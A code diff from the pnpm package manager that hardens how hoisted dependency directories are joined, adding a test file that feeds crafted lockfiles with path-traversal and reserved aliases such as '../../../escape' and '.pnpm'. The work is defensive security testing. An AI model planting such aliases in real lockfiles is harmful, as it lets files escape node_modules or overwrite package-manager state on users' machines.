+ import { packageIsInstallable } from '@pnpm/package-is-installable'
+ import { type PatchGroupRecord, getPatchInfo } from '@pnpm/patching.config'
+ import { safeReadPackageJsonFromDir } from '@pnpm/read-package-json'
++import { safeJoinModulesDir } from '@pnpm/symlink-dependency'
+ import { type DepPath, type SupportedArchitectures, type ProjectId, type Registries, type AllowBuild } from '@pnpm/types'
+ import {
+   type FetchPackageToStoreFunction,
+@@ -216,7 +217,7 @@
+       return
+     }
+ 
+-    const dir = path.join(modules, dep.name)
++    const dir = safeJoinModulesDir(modules, dep.name)
+     const depLocation = path.relative(opts.lockfileDir, dir)
+     const resolution = pkgSnapshotToResolution(depPath, pkgSnapshot, opts.registries)
+     let fetchResponse!: ReturnType<FetchPackageToStoreFunction>
+--- /dev/null
++++ b/pkg-manager/headless/test/lockfileToHoistedDepGraph.test.ts
+@@ -0,0 +1,86 @@
++/// <reference path="../../../__typings__/index.d.ts" />
++import fs from 'fs'
++import path from 'path'
++
++import { type LockfileObject } from '@pnpm/lockfile.fs'
++import { tempDir } from '@pnpm/prepare'
++
++// Imported from the built output rather than `../src` on purpose: the source
++// pulls in `@yarnpkg/nm`'s `HoisterResult` type, which ts-jest cannot resolve
++// transitively under `moduleResolution: node`. The `.d.ts` is a lib file, so
++// `skipLibCheck` skips it, and the test exercises the shipped graph builder.
++import { lockfileToHoistedDepGraph } from '../lib/lockfileToHoistedDepGraph.js'
++
++// A crafted lockfile whose dependency *alias* (the key pnpm turns into a
++// `node_modules/<alias>` directory) is a path-traversal or reserved name,
++// pointing at an otherwise ordinary package snapshot. The `nodeLinker:
++// hoisted` restore path reads aliases straight from the lockfile, so this
++// is the shape an attacker who can ship a lockfile would use to escape
++// `node_modules` or overwrite pnpm-owned layout (`.bin` / `.pnpm`).
++function craftedLockfile (alias: string): LockfileObject {
++  return {
++    lockfileVersion: '9.0',
++    importers: {
++      '.': {
++        dependencies: { [alias]: '1.0.0' },
++        specifiers: { [alias]: '1.0.0' },
++      },
++    },
++    packages: {
++      [`${alias}@1.0.0`]: {
++        resolution: { integrity: 'sha512-deadbeef' },
++      },
++    },
++  } as unknown as LockfileObject
++}
++
++// `force: true` skips the installability check so the walk reaches the
++// alias sink directly; the store controller throws if touched, proving
++// the alias is rejected before any fetch or filesystem work.
++function hoistedOpts (lockfileDir: string): Parameters<typeof lockfileToHoistedDepGraph>[2] {
++  const unreachable = (name: string) => () => {
++    throw new Error(`${name} must not be reached for a rejected alias`)
++  }
++  return {
++    autoInstallPeers: false,
++    engineStrict: false,
++    force: true,
++    importerIds: ['.'],
++    include: { dependencies: true, devDependencies: true, optionalDependencies: true },
++    ignoreScripts: false,
++    lockfileDir,
++    nodeVersion: process.version,
++    pnpmVersion: '0.0.0',
++    registries: { default: 'http://localhost/' },
++    sideEffectsCacheRead: false,
++    skipped: new Set<string>(),
++    storeController: {
++      fetchPackage: unreachable('fetchPackage'),
++      getFilesIndexFilePath: unreachable('getFilesIndexFilePath'),
++    },
++    storeDir: path.join(lockfileDir, 'store'),
++    virtualStoreDir: path.join(lockfileDir, 'node_modules', '.pnpm'),
++  } as unknown as Parameters<typeof lockfileToHoistedDepGraph>[2]
++}
++
++test.each([
++  '../../../escape',
++  '@scope/../../escape',
++  '.bin',
++  '.pnpm',
++  'node_modules',
++])('lockfileToHoistedDepGraph rejects hoisted alias %p', async (alias) => {
++  const dir = tempDir(false)
++  await expect(
++    lockfileToHoistedDepGraph(craftedLockfile(alias), null, hoistedOpts(dir))
++  ).rejects.toThrow(expect.objectContaining({ code: 'ERR_PNPM_INVALID_DEPENDENCY_NAME' }))
++})
++
++test('lockfileToHoistedDepGraph does not create a file outside node_modules for a traversal alias', async () => {
++  const dir = tempDir(false)
++  const escaped = path.join(dir, 'node_modules', '..', '..', '..', 'escape')
++  await expect(
++    lockfileToHoistedDepGraph(craftedLockfile('../../../escape'), null, hoistedOpts(dir))
++  ).rejects.toThrow(expect.objectContaining({ code: 'ERR_PNPM_INVALID_DEPENDENCY_NAME' }))
++  expect(fs.existsSync(escaped)).toBe(false)
++})
